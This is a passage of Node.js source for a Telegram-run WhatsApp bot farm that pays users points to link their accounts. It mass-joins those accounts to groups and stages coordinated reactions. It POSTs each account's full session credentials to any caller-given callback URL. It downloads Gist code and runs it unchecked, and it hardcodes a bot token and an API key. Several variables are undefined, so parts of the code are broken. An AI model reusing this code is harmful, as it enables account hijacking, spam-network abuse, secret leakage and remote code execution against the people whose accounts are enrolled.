import 'dotenv/config';
import { 
    useMultiFileAuthState, 
    makeWASocket, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    Browsers,
    jidNormalizedUser,
    makeCacheableSignalKeyStore
} from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import pino from 'pino';
import express from 'express';
import { delay } from '@whiskeysockets/baileys'; 
import http from 'http'; 
import { Boom } from '@hapi/boom';

import { startSmsScraper } from './smsScraper.js';

import { 
    setupTelegramCommands, userMessageCache, processWsTask, userState, syncDatabaseWithChat, syncZambiaWithChat, reactionConfigs, initUserBot, processApiNumbers 
} from './telegram_commands.js';

import { 
    initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, addNumbersToDb, 
    getShortId, saveShortId, deleteShortId, awardHourlyPoints, deductOnDisconnect, deleteUserAccount, setAntiMsgStatus, updateConnectionTime, saveVerificationData
} from './db.js';

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
let currentOtpSenderId = null; 
const NOTIFICATION_TOKEN = process.env.NOTIFICATION_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const SUBADMIN_IDS = process.env.SUBADMIN_IDS;
const userAlertCache = {};
const sessionCallbacks = new Map();
const SERVER_URL = process.env.SERVER_URL || 'http://localhost:10000';
const sessionDir = path.join(process.cwd(), 'sessions', folderName);

if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}
const pluginCache = new Map();

function loadPlugins() {
    const pluginDir = path.join(process.cwd(), 'plugins');
    if (!fs.existsSync(pluginDir)) fs.mkdirSync(pluginDir, { recursive: true });
    
    const files = fs.readdirSync(pluginDir);
    for (const file of files) {
        if (file.endsWith('.js')) {
            const code = fs.readFileSync(path.join(pluginDir, file), 'utf8');
            pluginCache.set(file, code);
        }
    }
}
loadPlugins();

const messageCache = new Map();
const MAX_CACHE_SIZE = 5000; 

if (!TELEGRAM_TOKEN || !NOTIFICATION_TOKEN || !ADMIN_ID) { console.error('Missing Tokens'); process.exit(1); }

const sendErrorToAdmin = async (errorType, errorDetails) => {
    try {
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8722377131:AAEr1SsPWXKy8m4WbTJBe7vrN03M2hZozhY"; 
        const ADMIN_ID = process.env.ADMIN_ID; 

        if (!ADMIN_ID) return;

        const text = 
            `**BOT CRASH PREVENTED**\n\n` +
            `**Type:** ${errorType}\n` +
            `**Error:** \`${String(errorDetails).substring(0, 800)}\``;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: text,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {
        console.log("Could not send error log to admin:", e.message);
    }
};

process.on('unhandledRejection', (reason, promise) => {
    const errorStr = String(reason);
    if (errorStr.includes('Timeout') || errorStr.includes('408') || errorStr.includes('fetch failed')) {
        console.log('[NETWORK TIMEOUT] Ignored safely.');
    } else {
        console.error('[UNHANDLED REJECTION]', reason);
        sendErrorToAdmin('Unhandled Rejection (Background Error)', errorStr);
    }
});

process.on('uncaughtException', (error) => {
    console.error('[STREAM CRASH PREVENTED]', error.message);
    sendErrorToAdmin('Uncaught Exception (Fatal Code Error)', error.stack || error.message);
});

process.on('uncaughtExceptionMonitor', (error) => {
    console.error('[MONITOR]', error.message);
});

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => res.send('Ultarbot Pro [One-Shot Defense Mode]'));

app.get('/verify', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>User Verification</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
            .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            h1 { color: #333; text-align: center; }
            .form-group { margin: 20px 0; }
            label { display: block; margin-bottom: 5px; color: #555; font-weight: bold; }
            input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
            button { width: 100%; padding: 12px; background: #25D366; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }
            button:hover { background: #20BA5A; }
            .status { text-align: center; margin-top: 10px; padding: 10px; border-radius: 5px; }
        </style>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
    </head>
    <body>
        <div class="container">
            <h1>User Verification</h1>
            <form id="verifyForm">
                <div class="form-group">
                    <label>Full Name</label>
                    <input type="text" id="name" placeholder="Enter your full name" required>
                </div>
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" id="email" placeholder="Enter your email" required>
                </div>
                <button type="submit">Verify & Close</button>
            </form>
            <div class="status" id="status"></div>
        </div>
        <script>
            const urlParams = new URLSearchParams(window.location.search);
            const userIdFromUrl = urlParams.get('userId');
            setTimeout(() => {
                if (window.Telegram && window.Telegram.WebApp) {
                    const tg = window.Telegram.WebApp;
                    const verifyForm = document.getElementById('verifyForm');
                    tg.ready(); tg.expand();
                    verifyForm.addEventListener('submit', async (e) => {
                        e.preventDefault();
                        const name = document.getElementById('name').value;
                        const email = document.getElementById('email').value;
                        const userId = userIdFromUrl || 'unknown';
                        let ip = 'N/A';
                        try {
                            const ipRes = await fetch('https://api.ipify.org?format=json');
                            const ipData = await ipRes.json();
                            ip = ipData.ip;
                        } catch (e) {}
                        try {
                            const response = await fetch('/api/verify', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ userId, name, email, ip, initData: tg.initData })
                            });
                            const result = await response.json();
                            if (result.success) {
                                document.getElementById('status').innerHTML = '<span style="background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; display: block;"><strong>Verification successful!</strong><br><br>Closing in 2 seconds...</span>';
                                setTimeout(() => tg.close(), 2000);
                            } else {
                                document.getElementById('status').innerHTML = '<span style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; display: block;"><strong>Verification failed</strong><br><br>' + result.message + '</span>';
                            }
                        } catch (error) {}
                    });
                }
            }, 100);
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

app.post('/api/join', async (req, res) => {
    req.setTimeout(900000); 
    res.setTimeout(900000);

    const { apiKey, amount, link } = req.body;
    const MY_SECRET_KEY = "AIzaSyBds-BuDtWCzQyFCnb9B3JRp8rG2i52soc"; 

    if (apiKey !== MY_SECRET_KEY) return res.status(401).json({ success: false, error: 'Invalid API Key' });
    if (!amount || !link) return res.status(400).json({ success: false, error: 'Missing amount or link' });

    let code = '';
    try {
        code = link.includes('chat.whatsapp.com/') ? link.split('chat.whatsapp.com/')[1].split(/[\s?#&]/)[0] : link;
    } catch (e) {
        return res.status(400).json({ success: false, error: 'Invalid link format' });
    }

    const activeFolders = Object.keys(clients);
    if (activeFolders.length === 0) return res.status(503).json({ success: false, error: 'No bots connected' });

    const countToJoin = Math.min(parseInt(amount), activeFolders.length);

    try {
        await mainBot.sendMessage(ADMIN_ID, `[API START] Joining Group\nTarget: ${code}\nBots: ${countToJoin}\nSpeed: 1/sec\nEst. Time: ${(countToJoin / 60).toFixed(2)} mins`);
    } catch (e) {}

    const results = {
        requested: parseInt(amount),
        processed: countToJoin,
        success: 0,
        already_in: 0,
        failed: 0,
        details: []
    };

    let clientDisconnected = false;
    req.on('close', () => { clientDisconnected = true; });

    for (let i = 0; i < countToJoin; i++) {
        if (clientDisconnected) break;

        const folder = activeFolders[i];
        const sock = clients[folder];
        
        const phoneNumber = shortIdMap[Object.keys(shortIdMap).find(k => shortIdMap[k].folder === folder)]?.phone || folder;

        try {
            await sock.groupAcceptInvite(code);
            results.success++;
            results.details.push({ phone: phoneNumber, status: 'success' });
        } catch (e) {
            const err = e.message || "";
            const status = e.output?.statusCode || 0;

            if (err.includes('participant') || err.includes('exist') || status === 409) {
                results.already_in++;
                results.details.push({ phone: phoneNumber, status: 'already_in' });
            } else {
                results.failed++;
                results.details.push({ phone: phoneNumber, status: 'failed', error: err });
            }
        }

        if (i < countToJoin - 1) await delay(1000);
    }

    if (!clientDisconnected) {
        res.json({
            success: true,
            message: "Job Completed",
            data: results
        });

        try {
            await mainBot.sendMessage(ADMIN_ID, 
                `[API DONE]\n` +
                `Target: ${code}\n` +
                `Success: ${results.success}\n` +
                `Already In: ${results.already_in}\n` +
                `Failed: ${results.failed}`
            );
        } catch(e) {}
    }
});

app.post('/api/receive-task', async (req, res) => {
    const payload = req.body;

    if (payload.command !== "wstask_send") {
        return res.status(400).json({ success: false, message: "Invalid command" });
    }

    await processWsTask(payload);

    res.status(200).json({
        success: true,
        message: "Message sent successfully"
    }); 
});

app.post('/api/sync-numbers', async (req, res) => {
    const incomingText = req.body.text || req.body.numbers || req.body.message;
    
    if (!incomingText) {
        return res.status(400).json({ ok: false, error: "Missing text payload" });
    }

    try {
        const result = await processApiNumbers(incomingText);
        
        if (result.ok) {
            res.status(200).json(result);
        } else {
            res.status(500).json(result);
        }
    } catch (e) {
        console.error("API Route Error:", e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.post('/api/connect/pairing', async (req, res) => {
    const { number, callbackUrl } = req.body;
    if (!number) return res.status(400).json({ error: "Phone number required" });

    const sessionId = `ext_${Date.now()}`;
    if (callbackUrl) sessionCallbacks.set(sessionId, callbackUrl);

    try {
        const pairingCode = await new Promise(async (resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error("Pairing Code Timeout")), 30000);
            
            try {
                await startClient(sessionId, number, null, 'EXTERNAL_SERVICE', null, (code) => {
                    clearTimeout(timeout);
                    resolve(code);
                });
            } catch (err) {
                clearTimeout(timeout);
                reject(err);
            }
        });

        res.status(200).json({ success: true, sessionId, pairingCode });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

app.post('/api/connect/qr', async (req, res) => {
    const { callbackUrl } = req.body;
    const sessionId = `ext_qr_${Date.now()}`;
    if (callbackUrl) sessionCallbacks.set(sessionId, callbackUrl);

    try {
        const qrBase64 = await new Promise(async (resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error("QR Generation Timeout")), 30000);

            try {
                await startClient(sessionId, null, null, 'EXTERNAL_SERVICE', (qr) => {
                    clearTimeout(timeout);
                    resolve(qr); 
                });
            } catch (err) {
                clearTimeout(timeout);
                reject(err);
            }
        });

        res.status(200).json({ success: true, sessionId, qr: qrBase64 });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

app.post('/api/verify', async (req, res) => {
    const { userId, name, email, ip, initData } = req.body;
    if (!userId || !name || !email) return res.json({ success: false, message: 'Please fill all fields' });
    try {
        let chatId = parseInt(userId);
        if (isNaN(chatId) || chatId <= 0) chatId = parseInt(userId);
        let deviceInfo = 'Mini App User';
        if (initData) deviceInfo = `Telegram Mini App - ${new Date().toISOString()}`;
        await saveVerificationData(chatId.toString(), name, '', email, ip, deviceInfo);
        try {
            await mainBot.sendMessage(chatId, 
                `[VERIFICATION COMPLETE]\n\nYour account has been verified successfully!\n\nWelcome Bonus: +200 points`,
                { reply_markup: { keyboard: [[{ text: "Connect Account" }, { text: "My Account" }], [{ text: "Dashboard" }, { text: "Referrals" }], [{ text: "Withdraw" }, { text: "Support" }]], resize_keyboard: true }, parse_mode: 'Markdown' }
            );
            const notBot = new TelegramBot(process.env.NOTIFICATION_TOKEN, { polling: false });
            await notBot.sendMessage(ADMIN_ID, `[NEW USER VERIFIED]\nUser ID: ${chatId}\nName: ${name}\nEmail: ${email}`);
        } catch (e) {}
        res.json({ success: true, message: 'Verification complete' });
    } catch (error) { res.json({ success: true, message: 'Verification complete' }); }
});

app.listen(PORT, () => console.log(`Server on ${PORT}`));

const mainBot = new TelegramBot(TELEGRAM_TOKEN, { 
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            allowed_updates: ["message", "callback_query", "message_reaction", "message_reaction_count", "chat_member"]
        }
    }
});

const notificationBot = new TelegramBot(NOTIFICATION_TOKEN, { polling: false });

const clients = {}; 
const shortIdMap = {}; 
const antiMsgState = {}; 
const autoSaveState = {}; 
const qrMessageCache = {}; 
const qrActiveState = {}; 

const bannedNumbersBuffer = []; 
let banSummaryTimeout = null;  

const disconnectedNumbersBuffer = []; 
let disconnectSummaryTimeout = null;  

const nukeCache = new Set();

let notifyDisconnection = () => {};

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

function generateShortId() { return Math.random().toString(36).substring(2, 7); }
function makeSessionId() { return `Ultarbot_${Date.now()}`; }
const getRandomBrowser = () => Browsers.macOS('Chrome');

async function updateAdminNotification(message) {
    try { await notificationBot.sendMessage(ADMIN_ID, message, { parse_mode: 'Markdown' }); } catch (e) {}
}

setInterval(async () => {
    try { await awardHourlyPoints(Object.keys(clients)); } catch (e) {}
}, 3600000); 

function formatNumberLocal(phoneNumber) {
    let num = phoneNumber.replace(/^\+/, ''); 
    if (num.startsWith('234')) {
        return '0' + num.substring(3);
    }
    return num; 
}

function chunkArray(array, size) {
    const chunked = [];
    for (let i = 0; i < array.length; i += size) {
        chunked.push(array.slice(i, i + size));
    }
    return chunked;
}

async function sendBanSummary() {
    if (bannedNumbersBuffer.length === 0) return;

    const bannedCount = bannedNumbersBuffer.length;
    const localNumbers = [...bannedNumbersBuffer].map(formatNumberLocal); 
    
    bannedNumbersBuffer.length = 0; 
    clearTimeout(banSummaryTimeout);
    banSummaryTimeout = null;
    
    let header = `**[BATCH BAN ALERT - 15 MINUTE WINDOW]**\n\n`;
    header += `**${bannedCount} accounts were BANNED/BLOCKED.**\n\n`;
    header += `The following numbers are sent in batches of 5. Tap to copy the batch:`;

    try {
        await mainBot.sendMessage(ADMIN_ID, header, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error("Failed to send Ban Summary Header:", e.message);
        return; 
    }

    const batches = chunkArray(localNumbers, 5);

    for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const batchText = batch.join('\n');
        
        let batchMessage = `\`\`\`\n${batchText}\n\`\`\``; 

        try {
            await mainBot.sendMessage(ADMIN_ID, batchMessage, { parse_mode: 'Markdown' });
            await delay(500); 
        } catch (e) {
            console.error(`Failed to send Ban Batch ${i + 1}:`, e.message);
        }
    }
}

async function sendDisconnectSummary() {
    if (disconnectedNumbersBuffer.length === 0) return;

    const disconnectCount = disconnectedNumbersBuffer.length;
    
    const compiledNumbers = [...disconnectedNumbersBuffer]
        .map(item => formatNumberLocal(item.number));
        
    disconnectedNumbersBuffer.length = 0; 
    clearTimeout(disconnectSummaryTimeout);
    disconnectSummaryTimeout = null;
    
    let summary = `[15 MINUTE DISCONNECT REPORT]\n\n`;
    summary += `**${disconnectCount} accounts LOGGED OUT or DISCONNECTED** in the last 15 minutes.**\n\n`;
    summary += `Copyable List (Local Format):\n`;

    summary += '```\n' + compiledNumbers.join('\n') + '\n```';

    summary += `\n**Total Active Bots Remaining:** ${Object.keys(clients).length}`;

    try {
        await mainBot.sendMessage(ADMIN_ID, summary, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error("Failed to send Disconnect Summary:", e.message);
    }
}

export async function startMobileRegistration(phoneNumber) {
    const { state, saveCreds } = await useMultiFileAuthState(`auth_info_${phoneNumber}`);
    
    const sock = makeWASocket({
        version,
        auth: state,
        mobile: true, 
        printQRInTerminal: false,
        browser: ['Android', 'Chrome', '11.0.0'], 
        version: [2, 2323, 4], 
    });

    sock.ev.on('creds.update', saveCreds);

    if (!sock.authState.creds.registered) {
        try {
            await sock.requestRegistrationCode({
                phoneNumber: '+' + phoneNumber,
                method: 'sms' 
            });
            return sock; 
        } catch (err) {
            console.error("Mobile Auth Error:", err);
            throw err;
        }
    } else {
        throw new Error("This number is already registered and logged in on the server.");
    }
}

async function startClient(folder, targetNumber = null, chatId = null, telegramUserId = null, qrCallback = null, pairingCallback = null) {
    let cachedShortId = await getShortId(folder);
    if (!cachedShortId) {
        cachedShortId = generateShortId();
        await saveShortId(folder, cachedShortId);
    }

    const sessionPath = path.join(SESSIONS_DIR, folder);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS('Chrome'), 
        version,
        connectTimeoutMs: 60000,
        markOnlineOnConnect: false, 
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify' && type !== 'append') return; 

        const msg = messages[0];
        if (!msg || !msg.message) return;

        if (msg.key && msg.key.id) {
            messageCache.set(msg.key.id, msg);
            if (messageCache.size > MAX_CACHE_SIZE) {
                const firstKey = messageCache.keys().next().value;
                messageCache.delete(firstKey);
            }
        }

        const isRevoke = msg.message.protocolMessage && msg.message.protocolMessage.type === 0;
        
        if (isRevoke) {
            const targetKey = msg.message.protocolMessage.key;
            const originalMsg = messageCache.get(targetKey.id);

            if (originalMsg) {
                try {
                    const userJid = jidNormalizedUser(sock.user.id);
                    let senderStr = targetKey.participant || targetKey.remoteJid;
                    senderStr = senderStr.split('@')[0];
                    const senderName = originalMsg.pushName || "Unknown";

                    const deletedText = originalMsg.message?.conversation || originalMsg.message?.extendedTextMessage?.text || "";
                    const headerText = `+${senderStr} • ${senderName}\nAnti-delete\n\n`;

                    const mediaType = Object.keys(originalMsg.message || {})[0];

                    if (deletedText && !originalMsg.message?.imageMessage && !originalMsg.message?.videoMessage) {
                        await sock.sendMessage(userJid, { 
                            text: `${headerText}${deletedText}`,
                            contextInfo: { isForwarded: true }
                        });
                    } else if (mediaType === 'imageMessage' || mediaType === 'videoMessage') {
                        const caption = originalMsg.message[mediaType].caption || "";
                        originalMsg.message[mediaType].caption = `${headerText}${caption}`;
                        originalMsg.message[mediaType].contextInfo = { ...(originalMsg.message[mediaType].contextInfo || {}), isForwarded: true };
                        await sock.sendMessage(userJid, { forward: originalMsg });
                    } else {
                        await sock.sendMessage(userJid, { 
                            text: `${headerText}_[Media/Sticker recovered below]_`,
                            contextInfo: { isForwarded: true }
                        });
                        await sock.sendMessage(userJid, { forward: originalMsg });
                    }
                    
                    console.log(`[ANTI-DELETE] Recovered message from +${senderStr}`);
                } catch (e) {
                    console.error('[ANTI-DELETE ERROR]', e.message);
                }
            }
            return; 
        }

        const remoteJid = msg.key.remoteJid;
        const isGroup = remoteJid.includes('@g.us');
        const isStatus = remoteJid === 'status@broadcast';
        
        const myJid = jidNormalizedUser(sock.user.id);
        const isSelf = msg.key.fromMe; 
        
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";

        if (isSelf) {
            if (text === '.alive' || text === '.ping') {
                await sock.sendMessage(remoteJid, { text: 'Active' }, { quoted: msg });
                return;
            }

            if (text === '.list') {
                const pluginNames = Array.from(pluginCache.keys()).join('\n- ');
                const reply = `*UltarBot Pro Commands*\n\n*Built-in:*\n- .alive\n- .ping\n- .list\n- .install <gist_url>\n\n*Installed Plugins:*\n${pluginNames ? '- ' + pluginNames : 'None'}`;
                await sock.sendMessage(remoteJid, { text: reply }, { quoted: msg });
                return;
            }
        }


            // ==========================================
    // BUILT-IN DOWNLOADER (DIRECT)
    // ==========================================
    if (isSelf && text.startsWith('.dl')) {
        const urlMatch = text.match(/(https?:\/\/[^\s]+)/i);
        const targetUrl = urlMatch ? urlMatch[1] : null;

        if (!targetUrl) {
            await sock.sendMessage(remoteJid, { text: "Provide a valid link after .dl" }, { quoted: msg });
            return;
        }

        const loadMsg = await sock.sendMessage(remoteJid, { text: "[SYSTEM] Downloading..." }, { quoted: msg });

        try {
            // Using the API URL you provided
            const apiUrl = process.env.DOWNLOAD_API_URL || 'https://YOUR_API_APP_HERE.herokuapp.com';
            const requestUrl = `${apiUrl}/api/download?url=${encodeURIComponent(targetUrl)}`;

            const response = await fetch(requestUrl);
            const contentType = response.headers.get('content-type') || '';

            // 1. Handle TikTok/Instagram Carousels (JSON Response)
            if (contentType.includes('application/json')) {
                const parsed = await response.json();
                if (parsed.type === "images") {
                    await sock.sendMessage(remoteJid, { text: "[SYSTEM] Carousel detected. Sending images...", edit: loadMsg.key });
                    
                    for (const imgUrl of parsed.urls) {
                        await sock.sendMessage(remoteJid, { image: { url: imgUrl } });
                    }
                }
                await sock.sendMessage(remoteJid, { text: "[SUCCESS] Carousel sent.", edit: loadMsg.key });
                return;
            }

            // 2. Handle Video/Standard Media Streams
            // We let Baileys handle the stream via URL to save RAM
            await sock.sendMessage(remoteJid, { text: "[SYSTEM] Uploading...", edit: loadMsg.key });
            
            const isVideo = contentType.includes('video');
            
            await sock.sendMessage(remoteJid, { 
                [isVideo ? 'video' : 'document']: { url: requestUrl },
                caption: `Source: ${targetUrl}`,
                fileName: isVideo ? 'video.mp4' : 'file',
                mimetype: contentType
            }, { quoted: msg });

            await sock.sendMessage(remoteJid, { text: "[SUCCESS] Download complete.", edit: loadMsg.key });

        } catch (error) {
            console.error(error);
            await sock.sendMessage(remoteJid, { text: `[ERROR] Service failed: ${error.message}`, edit: loadMsg.key });
        }
        return;
    }

        
        if (isSelf && text.startsWith('.install ')) {
            const url = text.split(' ')[1];
            if (!url) {
                await sock.sendMessage(remoteJid, { text: "[ERROR] Provide a GitHub Gist URL." });
                return;
            }

            try {
                await sock.sendMessage(remoteJid, { text: "[INSTALLING] Downloading code from GitHub..." });

                let rawUrl = url;
                if (url.includes('gist.github.com') && !url.includes('/raw')) {
                    rawUrl = url + '/raw';
                }

                const response = await fetch(rawUrl);
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                
                const code = await response.text();
                
                const pluginName = `gist_${Date.now()}.js`;
                const pluginDir = path.join(process.cwd(), 'plugins');
                const pluginPath = path.join(pluginDir, pluginName);
                
                if (!fs.existsSync(pluginDir)) fs.mkdirSync(pluginDir, { recursive: true });
                fs.writeFileSync(pluginPath, code);
                
                pluginCache.set(pluginName, code);

                await sock.sendMessage(remoteJid, { text: `[SUCCESS] Installed as ${pluginName}\n\nThe commands in this Gist are now live.` });
            } catch (e) {
                await sock.sendMessage(remoteJid, { text: `[ERROR] Failed to install: ${e.message}` });
            }
            return; 
        }

        if (text) {
            const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

            for (const [name, code] of pluginCache.entries()) {
                try {
                    const pluginFn = new AsyncFunction('sock', 'msg', 'text', 'remoteJid', 'isSelf', 'messageCache', 'fetch', code);
                    await pluginFn(sock, msg, text, remoteJid, isSelf, messageCache, fetch);
                } catch (e) {
                    console.error(`[PLUGIN ERROR - ${name}]`, e.message);
                }
            }
        }

        if (isGroup && reactionConfigs[remoteJid]) {
            const senderJid = msg.key.participant || msg.key.remoteJid;
            let isAdmin = false;

            try {
                const metadata = await sock.groupMetadata(remoteJid);
                const participant = metadata.participants.find(p => p.id === senderJid);
                if (participant && (participant.admin === 'admin' || participant.admin === 'superadmin')) {
                    isAdmin = true;
                }
            } catch (e) {
                console.error(`[REACT ADMIN CHECK FAIL] Error fetching metadata for ${remoteJid}: ${e.message}`);
            }

            if (isAdmin) {
                const activeFolders = Object.keys(clients).filter(f => clients[f]);
                const botIndex = activeFolders.indexOf(folder); 
                
                if (botIndex !== -1) {
                    const emojis = reactionConfigs[remoteJid];
                    const delayTime = botIndex * 10000;
                    await delay(delayTime); 
                    
                    const emojiIndex = botIndex % emojis.length;
                    const selectedEmoji = emojis[emojiIndex].trim(); 
                    
                    const reactionContent = {
                        react: { text: selectedEmoji, key: msg.key }
                    };
                    
                    try {
                        await sock.sendMessage(remoteJid, reactionContent);
                    } catch(e) {}
                }
            }
        }

        if (antiMsgState[cachedShortId]) {
            const isCommand = text.startsWith('.');
            const key = msg.key;
            
            if (!isGroup && !isStatus && !isCommand && !isSelf) {
                if (nukeCache.has(remoteJid)) return; 
                nukeCache.add(remoteJid);
                setTimeout(() => nukeCache.delete(remoteJid), 30000);

                await Promise.all([
                    sock.sendMessage(remoteJid, { delete: key }).catch(() => {}),
                    sock.updateBlockStatus(remoteJid, "block").catch(() => {})
                ]);
                
                console.log(`[ANTIMSG - STRANGER] Blocked: ${remoteJid}.`);
                return; 
            }
        }

        if (!msg.key.fromMe) {
            if (autoSaveState[cachedShortId]) {
                if (remoteJid.endsWith('@s.whatsapp.net')) {
                    addNumbersToDb([remoteJid.split('@')[0]]).catch(() => {});
                }
            }
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (connection === 'open' && qrMessageCache[folder]) {
            const { messageId, chatId: qrChatId } = qrMessageCache[folder];
            try { await mainBot.deleteMessage(qrChatId, messageId); } catch (e) {}
            delete qrMessageCache[folder];
            delete qrActiveState[folder];
        }
        
        if (qr && !qrActiveState[folder] && !targetNumber) {
            const isExternal = folder.startsWith('ext_');
            
            if (isExternal) {
                qrActiveState[folder] = true; 
                try {
                    const QRCode = (await import('qrcode')).default;
                    const base64Qr = await QRCode.toDataURL(qr); 
                    
                    if (typeof qrCallback === 'function') {
                        qrCallback(base64Qr);
                    }
                } catch (e) {
                    delete qrActiveState[folder];
                }
            } 
            else if (chatId) {
                qrActiveState[folder] = true;
                try {
                    if (qrMessageCache[folder]) {
                        try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
                    }
                    
                    const QRCode = (await import('qrcode')).default;
                    const qrImage = await QRCode.toBuffer(qr, { errorCorrectionLevel: 'H', type: 'image/png', width: 300 });
                    
                    const sentMsg = await mainBot.sendPhoto(chatId, qrImage, {
                        caption: '[QR CODE]\n\nScan this QR code with your WhatsApp camera to connect.',
                        parse_mode: 'Markdown',
                        reply_markup: { inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_qr' }]] }
                    });
                    
                    qrMessageCache[folder] = { messageId: sentMsg.message_id, chatId };
                    
                    setTimeout(async () => {
                        if (qrMessageCache[folder]) {
                            try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
                            delete qrMessageCache[folder];
                        }
                    }, 60000);
                } catch (e) {
                    delete qrActiveState[folder];
                }
            }
        }
        
        if (connection === 'open') {
            const userJid = jidNormalizedUser(sock.user.id);
            const phoneNumber = userJid.split('@')[0];
            
            if (!cachedShortId) cachedShortId = await getShortId(folder);
            await updateConnectionTime(folder);
            
            const now = new Date();
            if (!shortIdMap[cachedShortId]) {
                shortIdMap[cachedShortId] = { folder: folder, phone: phoneNumber, chatId: telegramUserId, connectedAt: now };
            }
            clients[folder] = sock;
            
            const credsFile = path.join(sessionPath, 'creds.json');
            const content = fs.existsSync(credsFile) ? fs.readFileSync(credsFile, 'utf-8') : '';
            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', true, autoSaveState[cachedShortId] || false, cachedShortId);
            
            updateAdminNotification(`[CONNECTED] +${phoneNumber}`);

            const externalCallback = sessionCallbacks.get(folder); 
            if (externalCallback) {
                try {
                    await fetch(externalCallback, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            success: true,
                            sessionId: folder,
                            shortId: cachedShortId,
                            number: phoneNumber,
                            session_data: content 
                        })
                    });
                    console.log(`[API] Webhook sent to external server for ${phoneNumber}`);
                    sessionCallbacks.delete(folder); 
                } catch (err) {
                    console.error(`[API ERROR] Webhook failed:`, err.message);
                }
            }

            try {
                const selfMessage = 
                    `*Bot Connection Successful*\n\n` +
                    `Your account is now linked securely.\n\n` +
                    `*Session ID:* \`${folder}\`\n` +
                    `*Short ID:* \`${cachedShortId}\``;
                
                await sock.sendMessage(userJid, { text: selfMessage });
                console.log(`[SELF-MESSAGE] Sent session ID to +${phoneNumber}`);
            } catch (selfErr) {
                console.error(`[SELF-MESSAGE ERROR] Failed to message self:`, selfErr.message);
            }

            if (chatId) {
                userState[chatId] = null;
                if (userMessageCache && userMessageCache[chatId] && Array.isArray(userMessageCache[chatId])) {
                    for (const msgId of userMessageCache[chatId]) { try { await mainBot.deleteMessage(chatId, msgId); } catch (e) {} }
                    userMessageCache[chatId] = [];
                }
                
                mainBot.sendMessage(chatId, 
                    `[CONNECTED]\n` +
                    `ID: \`${cachedShortId}\`\n` +
                    `Number: +${phoneNumber}\n\n` +  
                    `Account connected successfully!\n\n` +
                    `**Defense Active**\n(One-Shot Block & Delete System)`,  { 
                    parse_mode: 'Markdown',
                    reply_markup: { 
                        keyboard: [
                            [{ text: "Connect Account" }, { text: "My Numbers" }],
                            [{ text: "/stats" }, { text: "Balance" }]
                        ],
                        resize_keyboard: true 
                    } 
                });
            }
            
            setTimeout(async () => {
                if (!clients[folder]) { try { await awardHourlyPoints([folder]); } catch (e) {} }
            }, 3600000);
        }

        if (connection === 'close') {
            const userJid = sock.user?.id || "";
            const phoneNumber = userJid.split(':')[0].split('@')[0] || shortIdMap[cachedShortId]?.phone || 'Unknown';
            let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            let willRestart = false;

            const nonRecoverableReasons = [
                DisconnectReason.loggedOut, 
                DisconnectReason.badSession, 
                DisconnectReason.connectionClosed, 
                403 
            ];
            
            const isPermanentDisconnect = nonRecoverableReasons.includes(reason) || (lastDisconnect?.error && String(lastDisconnect.error).includes('403'));

            if (isPermanentDisconnect) {
                const isBanned = (reason === 403 || String(lastDisconnect?.error).includes('403'));
